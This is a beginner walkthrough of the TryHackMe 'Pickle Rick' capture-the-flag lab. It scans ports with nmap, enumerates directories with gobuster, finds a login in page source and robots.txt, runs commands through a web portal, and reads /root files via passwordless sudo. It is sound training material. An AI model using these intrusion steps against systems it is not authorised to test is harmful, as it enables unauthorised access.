# TryHackMe - Pickle Rick Walkthrough
---

## 1. Scanning

First, we start by scanning the target machine to see which ports are open.

```bash
nmap -T4 -sC -sV -A -p- 10.201.75.114
```
**Sample Output:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```
**Command Breakdown:**
- `-T4`: Set the speed of the scan (faster than default)
- `-sC`: Run default NSE scripts for discovery
- `-sV`: Attempt to determine the version of services
- `-A`: Enable OS detection, version detection, script scanning, and traceroute
- `-p-`: Scan all 65535 TCP ports
- SSH (22) is open → we may need credentials later.
- HTTP (80) is open → a website exists to explore.

---

## 2. Accessing the Website

We launch a browser (Firefox in our case) and type:

```
http://10.201.75.114
```

This loads the main webpage. Inspecting the page source reveals a username:

```
Username: R1ckRul3s
```

We take note of this username to use later for login.

---

## 3. Finding Hidden Directories

We use `gobuster` to enumerate hidden directories:

```bash
gobuster dir -u http://10.201.75.114 -w /usr/share/dirb/common.txt -x php,sh,txt,cgi,html,css,js,py
```

**Command Breakdown:**
- `-u`: Target URL
- `-w`: Wordlist for brute-forcing directories
- `-x`: File extensions to check

**Sample Output:**
```
/assets          (Status: 301)
/login.php       (Status: 200)
/portal.php      (Status: 200)
/robots.txt      (Status: 200)
```

We see `login.php`, `portal.php`, `assets/`, and `robots.txt`.

---

## 4. Finding the Password

Checking `robots.txt` via browser or curl:

```bash
curl http://10.201.75.114/robots.txt
```

**Output:**
```
Wubbalubbadubdub
```

This is our password. Now we can log in to `login.php` using:

- Username: `R1ckRul3s`
- Password: `Wubbalubbadubdub`

---

## 5. Accessing the Command Portal

Once logged in, we enter the **command portal**, which lets us run commands.

- First, check existing commands (files):

```bash
ls
```

**Output:**
```
Sup3rS3cretPickl3Ingred.txt
clue.txt
```

The first ingredient is in `Sup3rS3cretPickl3Ingred.txt`. Access it via:

```bash
curl http://10.201.75.114/Sup3rS3cretPickl3Ingred.txt
```

**Output:**
```
[First ingredient content]
```

---

## 6. Finding the Second Ingredient

Open `clue.txt` to get hints:

```bash
cat clue.txt
```

Hint mentions the file system → check `/home` directory:

```bash
ls /home
```

**Output:**
```
rick
ubuntu
```

Go into `rick` directory:

```bash
ls /home/rick
```

**Output:**
```
second ingredients
```

`cat` may be disabled, so we use `less` instead:

```bash
less '/home/rick/second ingredients'
```

**Output:**
```
[Second ingredient content]
```

**Explanation of `less`:**
- `less` lets you read files even if other commands (like `cat`) are blocked.
- Scrolls through content interactively without executing anything.
- [less-about](https://en.wikipedia.org/wiki/Less_(Unix)

---

## 7. Finding the Third Ingredient

Check `/root` directory:

```bash
ls /root
```

We do **not** have permission. Use `sudo` to elevate privileges:

```bash
sudo -l
```

**Output:**
```
User R1ckRul3s may run commands as root without password
```

Check contents of `/root`:

```bash
sudo ls /root
```

**Output:**
```
3rd.txt
```

Read the file using `less` with sudo:

```bash
sudo less /root/3rd.txt
```

**Output:**
```
[Third ingredient content]
```

**Explanation of `sudo`:**
- `sudo` allows running commands as the root user.
- `sudo -l` lists allowed commands without needing a password.

---

## 8. Summary of Ingredients

1. `Sup3rS3cretPickl3Ingred.txt` → First ingredient
2. `/home/rick/second ingredients` → Second ingredient
3. `/root/3rd.txt` → Third ingredient

---

# Congrats!
You have completed the Pickle Rick challenge on TryHackMe.
